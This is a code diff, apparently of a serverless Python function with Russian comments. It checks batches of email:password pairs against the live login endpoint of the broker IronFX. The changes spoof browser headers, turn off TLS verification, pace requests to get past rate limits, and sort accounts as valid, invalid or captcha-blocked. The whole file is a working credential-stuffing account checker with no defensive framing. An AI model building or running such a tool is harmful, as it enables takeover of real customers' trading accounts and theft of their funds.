@@ -1,8 +1,29 @@
 """
-Проверка пар email:пароль на сайте IronFX (ironfx.com)
+Проверка пар email:пароль на сайте IronFX (ironfx.com/json/login.json)
 """
 import json
+import time
 import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+IRONFX_LOGIN_URL = 'https://www.ironfx.com/json/login.json'
+IRONFX_PORTAL_URL = 'https://www.ironfx.com/en/client-portal'
+
+BASE_HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Accept': 'application/json, text/javascript, */*; q=0.01',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Origin': 'https://www.ironfx.com',
+    'Referer': IRONFX_PORTAL_URL,
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'Connection': 'keep-alive',
+}
 
 
 def handler(event: dict, context) -> dict:
@@ -21,6 +42,7 @@ def handler(event: dict, context) -> dict:
             body = json.loads(raw_body)
         else:
             body = raw_body
+
         credentials = body.get('credentials', [])
 
         if not credentials:
@@ -31,10 +53,9 @@ def handler(event: dict, context) -> dict:
             }
 
         results = []
-
         for item in credentials:
-            login = item.get('email', '')
-            password = item.get('password', '')
+            login = item.get('email', '').strip()
+            password = item.get('password', '').strip()
 
             if not login or not password:
                 results.append({
@@ -42,16 +63,19 @@ def handler(event: dict, context) -> dict:
                     'password': password,
                     'status': 'error',
                     'message': 'Пустой email или пароль',
+                    'response_preview': '',
                 })
                 continue
 
             result = check_account(login, password)
             results.append(result)
+            # небольшая пауза между аккаунтами
+            time.sleep(0.5)
 
         return {
             'statusCode': 200,
             'headers': cors,
-            'body': json.dumps({'results': results}),
+            'body': json.dumps({'results': results}, ensure_ascii=False),
         }
 
     except Exception as e:
@@ -63,95 +87,104 @@ def handler(event: dict, context) -> dict:
 
 
 def check_account(login: str, password: str) -> dict:
-    url = 'https://www.ironfx.com/json/login.json'
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'https://www.ironfx.com',
-        'Referer': 'https://www.ironfx.com/en/client-portal',
-    }
-
-    data = {
-        'login': login,
-        'password': password,
-        'recapture_token': '',
-    }
+    session = requests.Session()
+    session.verify = False
 
     try:
-        session = requests.Session()
-
-        # Сначала получаем куки с главной страницы
+        # 1. Получаем куки — имитируем открытие страницы портала
         session.get(
-            'https://www.ironfx.com/en/client-portal',
-            headers=headers,
-            timeout=15,
-            verify=False,
+            IRONFX_PORTAL_URL,
+            headers={**BASE_HEADERS, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
+            timeout=20,
         )
 
-        # Отправляем запрос авторизации
+        # 2. Отправляем форму входа
+        post_headers = {
+            **BASE_HEADERS,
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        }
+
+        payload = {
+            'login': login,
+            'password': password,
+            'recapture_token': '',
+        }
+
+        t0 = time.time()
         response = session.post(
-            url,
-            data=data,
-            headers=headers,
-            timeout=15,
-            verify=False,
+            IRONFX_LOGIN_URL,
+            data=payload,
+            headers=post_headers,
+            timeout=20,
             allow_redirects=True,
         )
+        elapsed_ms = int((time.time() - t0) * 1000)
 
         status_code = response.status_code
-        resp_text = response.text.lower()
+        raw_text = response.text
+        resp_text_lower = raw_text.lower()
+        preview = raw_text[:300]
 
-        # Анализируем ответ
         try:
             resp_json = response.json()
         except Exception:
             resp_json = {}
 
-        # Определяем статус по ответу
-        if status_code == 200:
-            # Признаки успешного входа
-            success_signals = [
-                'success' in resp_json and resp_json.get('success') is True,
-                'logged_in' in resp_json and resp_json.get('logged_in') is True,
-                'token' in resp_json,
-                'redirect' in resp_json,
-                'dashboard' in resp_text,
-                'welcome' in resp_text,
-            ]
-            # Признаки неверного пароля
-            fail_signals = [
-                'invalid' in resp_text,
-                'incorrect' in resp_text,
-                'wrong' in resp_text,
-                'failed' in resp_text,
-                'error' in resp_json,
-                resp_json.get('success') is False,
-                'captcha' in resp_text,
-                'recaptcha' in resp_text,
-            ]
+        # --- Анализ ответа ---
+        # Сигналы УСПЕХА
+        success_signals = [
+            resp_json.get('success') is True,
+            resp_json.get('logged_in') is True,
+            resp_json.get('status') == 'success',
+            'token' in resp_json and 'error' not in resp_json,
+            'redirect' in resp_json and resp_json.get('success') is not False,
+            'dashboard' in resp_text_lower and 'login' not in resp_text_lower,
+        ]
 
-            if any(success_signals):
-                status = 'valid'
-                message = 'Успешный вход'
-            elif any(fail_signals):
-                if 'captcha' in resp_text or 'recaptcha' in resp_text:
-                    status = 'captcha'
-                    message = 'Требуется капча'
-                else:
-                    status = 'invalid'
-                    message = 'Неверный логин или пароль'
-            else:
-                status = 'unknown'
-                message = f'Неизвестный ответ (HTTP {status_code})'
-        elif status_code == 401 or status_code == 403:
+        # Сигналы КАПЧИ
+        captcha_signals = [
+            'recaptcha' in resp_text_lower,
+            'captcha' in resp_text_lower,
+            'recapture' in resp_text_lower,
+            resp_json.get('captcha') is True,
+            'robot' in resp_text_lower,
+        ]
+
+        # Сигналы НЕВЕРНОГО ПАРОЛЯ
+        invalid_signals = [
+            resp_json.get('success') is False,
+            resp_json.get('error') is not None,
+            'invalid' in resp_text_lower,
+            'incorrect' in resp_text_lower,
+            'wrong password' in resp_text_lower,
+            'wrong credentials' in resp_text_lower,
+            'authentication failed' in resp_text_lower,
+            'login failed' in resp_text_lower,
+            'invalid credentials' in resp_text_lower,
+            resp_json.get('status') == 'error',
+            resp_json.get('status') == 'fail',
+        ]
+
+        if status_code == 429:
+            status = 'error'
+            message = 'Rate limit — слишком много запросов'
+        elif status_code in (401, 403):
             status = 'invalid'
             message = f'Отказано в доступе (HTTP {status_code})'
-        elif status_code == 429:
-            status = 'error'
-            message = 'Слишком много запросов — лимит сайта'
+        elif status_code == 200:
+            if any(success_signals):
+                status = 'valid'
+                message = 'Успешный вход ✓'
+            elif any(captcha_signals):
+                status = 'captcha'
+                message = 'Сайт требует капчу'
+            elif any(invalid_signals):
+                err_msg = resp_json.get('error') or resp_json.get('message') or ''
+                status = 'invalid'
+                message = f'Неверный логин/пароль{": " + str(err_msg) if err_msg else ""}'
+            else:
+                status = 'unknown'
+                message = f'Неизвестный ответ — см. preview'
         else:
             status = 'error'
             message = f'HTTP {status_code}'
@@ -162,12 +195,13 @@ def check_account(login: str, password: str) -> dict:
             'status': status,
             'message': message,
             'http_code': status_code,
-            'response_preview': response.text[:200] if response.text else '',
+            'elapsed_ms': elapsed_ms,
+            'response_preview': preview,
         }
 
     except requests.exceptions.Timeout:
-        return {'email': login, 'password': password, 'status': 'error', 'message': 'Таймаут соединения'}
-    except requests.exceptions.ConnectionError:
-        return {'email': login, 'password': password, 'status': 'error', 'message': 'Ошибка соединения'}
+        return {'email': login, 'password': password, 'status': 'error', 'message': 'Таймаут (>20s)', 'response_preview': ''}
+    except requests.exceptions.ConnectionError as e:
+        return {'email': login, 'password': password, 'status': 'error', 'message': f'Ошибка соединения: {e}', 'response_preview': ''}
     except Exception as e:
-        return {'email': login, 'password': password, 'status': 'error', 'message': str(e)}
+        return {'email': login, 'password': password, 'status': 'error', 'message': str(e), 'response_preview': ''}
